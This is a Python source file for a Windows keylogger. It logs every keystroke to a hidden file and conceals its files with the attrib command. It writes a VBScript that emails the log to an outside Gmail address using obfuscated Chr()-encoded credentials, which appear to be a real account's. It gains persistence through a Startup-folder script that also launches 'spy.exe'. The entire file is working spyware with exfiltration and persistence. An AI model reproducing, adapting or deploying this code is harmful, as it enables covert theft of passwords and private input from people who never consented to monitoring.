import os
import subprocess
from pynput.keyboard import Listener

count_char = 0
lst_int = ['<' + str(x) + '>' for x in range(96, 106)]

txt_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', '$KeyLogger.txt')
exe_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Downloads', 'spy.exe')
vbs_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'spy.vbs')
mail_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop', 'spymail.vbs')

subprocess.check_call(["attrib", "+H", exe_path])

def Anonymous(key):
	global count_char
	key = str(key)
	key = key.replace("'", "")
	if 'Key.' in key:
		split_str = key.split('.')
		key = '<' + split_str[1] + '>'
	if key == '<esc>':
		raise SystemExit(0)
	if key in lst_int:
		key = key.replace("<", "")
		key = key.replace(">", "")
		key = str(int(key) - 96)
	if key == '<110>':
		key = '.'
	if key == '<255>':
		key = '<startup>'

	with open(txt_path, 'a', encoding = 'utf-8') as file:
		file.write(key)
		count_char += 1
		if count_char == 100:
			count_char = 0
			file.write('\n')

if os.path.exists(txt_path):
	os.remove(txt_path)

if os.path.exists(mail_path) == False:
	with open(mail_path, 'w+', encoding = 'utf-8') as file:
		file.write('''Dim emailObj, emailConfig, fromEmail, toEmail, password\n\n''')
		file.write('''fromEmail = Chr(107) & Chr(105) & Chr(114) & Chr(121) & Chr(117) & Chr(115) & Chr(97) & Chr(116) & Chr(111) & Chr(117) & Chr(114) & Chr(105) & Chr(49) & Chr(52) & Chr(55) & Chr(53) & Chr(51) & Chr(54) & Chr(57)\n''')
		file.write('''password = Chr(74) & Chr(97) & Chr(99) & Chr(107) & Chr(121) & Chr(77) & Chr(97) & Chr(105) & Chr(48) & Chr(57) & Chr(48) & Chr(56) & Chr(50) & Chr(48) & Chr(48) & Chr(49)\n''')
		file.write('''toEmail = Chr(109) & Chr(97) & Chr(105) & Chr(98) & Chr(97) & Chr(111) & Chr(110) & Chr(97) & Chr(109) & Chr(50) & Chr(54) & Chr(48) & Chr(50) & Chr(49) & Chr(57)\n\n''')
		file.write('''Set emailObj = CreateObject("CDO.Message")\n''')
		file.write('''emailObj.From = fromEmail & "@gmail.com"\n''')
		file.write('''emailObj.To = toEmail & "@gmail.com"\n''')
		file.write('''emailObj.Subject = "Unknown Topic"\n''')
		file.write('''emailObj.TextBody = "Unknown Content"\n''')
		file.write(r'''emailObj.AddAttachment "%s"''' % txt_path)
		file.write('\n')
		file.write('''Set emailConfig = emailObj.Configuration\n\n''')
		file.write('''emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.gmail.com"\n''')
		file.write('''emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 465\n''')
		file.write('''emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2\n''')
		file.write('''emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpauthenticate") = 1\n''')
		file.write('''emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/smtpusessl") = true\n''')
		file.write('''emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendusername") = fromEmail & "@gmail.com"\n''')
		file.write('''emailConfig.Fields("http://schemas.microsoft.com/cdo/configuration/sendpassword") = password\n''')
		file.write('''emailConfig.Fields.Update\n\n''')
		file.write('''emailObj.Send\n\n''')
		file.write('''Set emailobj	= nothing\n''')
		file.write('''Set emailConfig	= nothing''')
		file.close()

	subprocess.check_call(["attrib", "+H", mail_path])

with open(txt_path, 'a', encoding = 'utf-8') as file:
	file.close()

subprocess.check_call(["attrib", "+H", txt_path])

if os.path.exists(vbs_path) == False:
	with open(vbs_path, 'w+', encoding = 'utf-8') as file:
		file.write(r'CreateObject("WScript.Shell").Run "%s"' % mail_path)
		file.write('\n')
		file.write(r'CreateObject("WScript.Shell").Run "%s"' % exe_path)
		file.close()

with Listener(on_press = Anonymous) as hacker:
	hacker.join()